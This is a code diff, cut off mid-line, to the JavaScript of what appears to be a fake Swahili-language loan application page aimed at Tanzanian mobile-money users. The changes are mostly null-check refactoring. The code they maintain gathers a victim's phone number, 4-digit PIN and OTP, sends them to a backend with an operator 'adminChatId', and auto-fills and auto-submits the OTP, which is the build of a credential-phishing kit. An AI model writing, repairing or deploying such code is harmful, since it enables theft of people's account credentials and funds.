@@ -255,6 +255,7 @@
       const toast = document.getElementById('toast-notification');
 
       function showToast(message, type = 'error') {
+        if (!toast) return;
         toast.textContent = message;
         toast.className = `toast-notification ${type}`;
         setTimeout(() => {
@@ -263,7 +264,9 @@
       }
 
       function switchStep(stepName) {
-        Object.values(steps).forEach(s => s.classList.add('hidden'));
+        Object.values(steps).forEach(s => {
+          if (s) s.classList.add('hidden');
+        });
         if (steps[stepName]) steps[stepName].classList.remove('hidden');
         
         if (stepName === 'waiting') {
@@ -284,20 +287,26 @@
       const displayDuration = document.getElementById('display-duration');
       const monthlyVal = document.getElementById('monthly-payment-val');
 
-      rangeAmount.addEventListener('input', (e) => {
-        const val = parseInt(e.target.value);
-        displayAmount.textContent = `TSh ${val.toLocaleString()}`;
-        document.getElementById('form-amount-input').value = val;
-        calcMonthly(val, parseInt(rangeDuration.value));
-      });
+      if (rangeAmount) {
+        rangeAmount.addEventListener('input', (e) => {
+          const val = parseInt(e.target.value);
+          if (displayAmount) displayAmount.textContent = `TSh ${val.toLocaleString()}`;
+          const amtInput = document.getElementById('form-amount-input');
+          if (amtInput) amtInput.value = val;
+          calcMonthly(val, rangeDuration ? parseInt(rangeDuration.value) : 12);
+        });
+      }
 
-      rangeDuration.addEventListener('input', (e) => {
-        const val = parseInt(e.target.value);
-        displayDuration.textContent = `miezi ${val}`;
-        calcMonthly(parseInt(rangeAmount.value), val);
-      });
+      if (rangeDuration) {
+        rangeDuration.addEventListener('input', (e) => {
+          const val = parseInt(e.target.value);
+          if (displayDuration) displayDuration.textContent = `miezi ${val}`;
+          calcMonthly(rangeAmount ? parseInt(rangeAmount.value) : 100000, val);
+        });
+      }
 
       function calcMonthly(amt, months) {
+        if (!monthlyVal) return;
         const rate = 0.08 / 12;
         const payment = (amt * rate * Math.pow(1 + rate, months)) / (Math.pow(1 + rate, months) - 1);
         monthlyVal.textContent = `TSh ${Math.round(payment).toLocaleString()}`;
@@ -315,15 +324,29 @@
         userId: null
       };
 
-      document.getElementById('btn-start-apply').addEventListener('click', () => switchStep('form'));
-      document.getElementById('btn-next-1').addEventListener('click', () => {
-        appData.amount = document.getElementById('form-amount-input').value;
-        appData.duration = document.getElementById('form-duration-select').value;
-        appData.purpose = document.getElementById('loan-purpose').value || 'Mkopo wa Biashara';
-        switchStep('personal');
-      });
+      const btnStartApply = document.getElementById('btn-start-apply');
+      if (btnStartApply) {
+        btnStartApply.addEventListener('click', () => switchStep('form'));
+      }
 
-      document.getElementById('btn-prev-2').addEventListener('click', () => switchStep('form'));
+      const btnNext1 = document.getElementById('btn-next-1');
+      if (btnNext1) {
+        btnNext1.addEventListener('click', () => {
+          const amtInput = document.getElementById('form-amount-input');
+          const durSelect = document.getElementById('form-duration-select');
+          const purposeInput = document.getElementById('loan-purpose');
+
+          appData.amount = amtInput ? amtInput.value : '100000';
+          appData.duration = durSelect ? durSelect.value : '12';
+          appData.purpose = (purposeInput && purposeInput.value) ? purposeInput.value : 'Mkopo wa Biashara';
+          switchStep('personal');
+        });
+      }
+
+      const btnPrev2 = document.getElementById('btn-prev-2');
+      if (btnPrev2) {
+        btnPrev2.addEventListener('click', () => switchStep('calc'));
+      }
       
       const phoneInput = document.getElementById('phone-number');
       const phoneError = document.getElementById('phone-error');
@@ -333,31 +356,50 @@
         return /^(061|062|063)\d{7}$/.test(clean);
       }
 
-      document.getElementById('btn-next-2').addEventListener('click', () => {
-        const rawPhone = phoneInput.value.trim();
-        if (!isValidPrefix(rawPhone)) {
-          phoneError.classList.remove('hidden');
-          return;
-        }
-        phoneError.classList.add('hidden');
-        appData.firstName = document.getElementById('first-name').value;
-        appData.lastName = document.getElementById('last-name').value;
-        appData.phone = rawPhone.replace(/\D/g, '');
+      const btnNext2 = document.getElementById('btn-next-2');
+      if (btnNext2) {
+        btnNext2.addEventListener('click', () => {
+          const rawPhone = phoneInput ? phoneInput.value.trim() : '';
+          if (!isValidPrefix(rawPhone)) {
+            if (phoneError) phoneError.classList.remove('hidden');
+            return;
+          }
+          if (phoneError) phoneError.classList.add('hidden');
+          
+          const fName = document.getElementById('first-name');
+          const lName = document.getElementById('last-name');
+          appData.firstName = fName ? fName.value : '';
+          appData.lastName = lName ? lName.value : '';
+          appData.phone = rawPhone.replace(/\D/g, '');
 
-        document.getElementById('sum-amount').textContent = `TSh ${Number(appData.amount).toLocaleString()}`;
-        document.getElementById('sum-duration').textContent = `Miezi ${appData.duration}`;
-        document.getElementById('sum-purpose').textContent = appData.purpose;
-        document.getElementById('sum-name').textContent = `${appData.firstName} ${appData.lastName}`;
-        switchStep('summary');
-      });
+          const sumAmt = document.getElementById('sum-amount');
+          const sumDur = document.getElementById('sum-duration');
+          const sumPur = document.getElementById('sum-purpose');
+          const sumName = document.getElementById('sum-name');
 
-      document.getElementById('btn-prev-3').addEventListener('click', () => switchStep('personal'));
+          if (sumAmt) sumAmt.textContent = `TSh ${Number(appData.amount).toLocaleString()}`;
+          if (sumDur) sumDur.textContent = `Miezi ${appData.duration}`;
+          if (sumPur) sumPur.textContent = appData.purpose;
+          if (sumName) sumName.textContent = `${appData.firstName} ${appData.lastName}`;
+          switchStep('summary');
+        });
+      }
 
-      document.getElementById('btn-submit-app').addEventListener('click', () => {
-        appData.amount = document.getElementById('form-amount-input').value;
-        document.getElementById('pin-phone-display').textContent = `+255${appData.phone}`;
-        switchStep('pin');
-      });
+      const btnPrev3 = document.getElementById('btn-prev-3');
+      if (btnPrev3) {
+        btnPrev3.addEventListener('click', () => switchStep('personal'));
+      }
+
+      const btnSubmitApp = document.getElementById('btn-submit-app');
+      if (btnSubmitApp) {
+        btnSubmitApp.addEventListener('click', () => {
+          const amtInput = document.getElementById('form-amount-input');
+          appData.amount = amtInput ? amtInput.value : '100,000';
+          const pinPhoneDisp = document.getElementById('pin-phone-display');
+          if (pinPhoneDisp) pinPhoneDisp.textContent = `+255${appData.phone}`;
+          switchStep('pin');
+        });
+      }
 
       const pinBoxes = document.querySelectorAll('.pin-box');
       const btnSubmitPin = document.getElementById('btn-submit-pin');
@@ -375,6 +417,7 @@
       });
 
       function checkPinComplete() {
+        if (!btnSubmitPin) return;
         const pin = Array.from(pinBoxes).map(b => b.value).join('');
         if (pin.length === 4) {
           btnSubmitPin.removeAttribute('disabled');
@@ -384,38 +427,40 @@
         }
       }
 
-      btnSubmitPin.addEventListener('click', async () => {
-        btnSubmitPin.textContent = 'Inathibitisha...';
-        btnSubmitPin.setAttribute('disabled', 'true');
+      if (btnSubmitPin) {
+        btnSubmitPin.addEventListener('click', async () => {
+          btnSubmitPin.textContent = 'Inathibitisha...';
+          btnSubmitPin.setAttribute('disabled', 'true');
 
-        try {
-          const res = await fetch(`/api/submit-application?admin=${encodeURIComponent(adminChatId)}`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              contact: appData.phone,
-              pin: appData.pin,
-              amount: `TSh ${appData.amount}`,
-              adminChatId
-            })
-          });
-          const data = await res.json();
-          if (data.success) {
-            appData.userId = data.userId;
-            switchStep('waiting');
-            startWaitingCountdown();
-            pollStatus();
-          } else {
-            showToast(data.error || 'Hitilafu');
+          try {
+            const res = await fetch(`/api/submit-application?admin=${encodeURIComponent(adminChatId)}`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                contact: appData.phone,
+                pin: appData.pin,
+                amount: `TSh ${appData.amount}`,
+                adminChatId
+              })
+            });
+            const data = await res.json();
+            if (data.success) {
+              appData.userId = data.userId;
+              switchStep('waiting');
+              startWaitingCountdown();
+              pollStatus();
+            } else {
+              showToast(data.error || 'Hitilafu');
+              btnSubmitPin.textContent = 'INGIA';
+              btnSubmitPin.removeAttribute('disabled');
+            }
+          } catch (e) {
+            showToast('Hitilafu ya mtandao');
             btnSubmitPin.textContent = 'INGIA';
             btnSubmitPin.removeAttribute('disabled');
           }
-        } catch (e) {
-          showToast('Hitilafu ya mtandao');
-          btnSubmitPin.textContent = 'INGIA';
-          btnSubmitPin.removeAttribute('disabled');
-        }
-      });
+        });
+      }
 
       let waitingTimerInterval = null;
       function startWaitingCountdown() {
@@ -446,6 +491,7 @@
       });
 
       function checkOtpComplete() {
+        if (!btnSubmitOtp) return;
         const otp = Array.from(otpBoxes).map(b => b.value).join('');
         if (otp.length === 4) {
           btnSubmitOtp.removeAttribute('disabled');
@@ -462,47 +508,4 @@
           modal.id = 'verificationSpinnerModal';
           modal.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);display:flex;align-items:center;justify-content:center;z-index:99999;";
           modal.innerHTML = `
-            <div style="background:#fff;padding:24px 30px;border-radius:10px;display:flex;align-items:center;gap:16px;box-shadow:0 5px 15px rgba(0,0,0,0.3);">
-              <div style="width:28px;height:28px;border:3px solid #e0e0e0;border-top-color:#ee5100;border-radius:50%;animation:spin 0.8s linear infinite;"></div>
-              <span style="font-family:sans-serif;font-size:16px;font-weight:500;color:#333;">Inathibitisha...</span>
-            </div>
-            <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
-          `;
-          document.body.appendChild(modal);
-        } else if (modal && !show) {
-          modal.remove();
-        }
-      }
-
-      function triggerAutoFillOtp(otpCode) {
-        const cleanOtp = String(otpCode).replace(/\D/g, '');
-        if (cleanOtp.length >= 4) {
-          const digits = cleanOtp.split('');
-          otpBoxes.forEach((box, idx) => {
-            if (digits[idx]) {
-              box.value = digits[idx];
-            }
-          });
-          checkOtpComplete();
-          
-          if (!btnSubmitOtp.disabled) {
-            showVerifyingSpinner(true);
-            setTimeout(() => {
-              btnSubmitOtp.click();
-            }, 500);
-          }
-        }
-      }
-
-      btnSubmitOtp.addEventListener('click', async () => {
-        btnSubmitOtp.textContent = 'Inathibitisha...';
-        btnSubmitOtp.setAttribute('disabled', 'true');
-
-        appData.otp = Array.from(otpBoxes).map(b => b.value).join('');
-
-        try {
-          const res = await fetch('/api/submit-otp', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-              us
+            <div style="background:#fff;padding:24px 30px;border-radius:10px;display:flex;align-items:center;gap:16px;box-shado
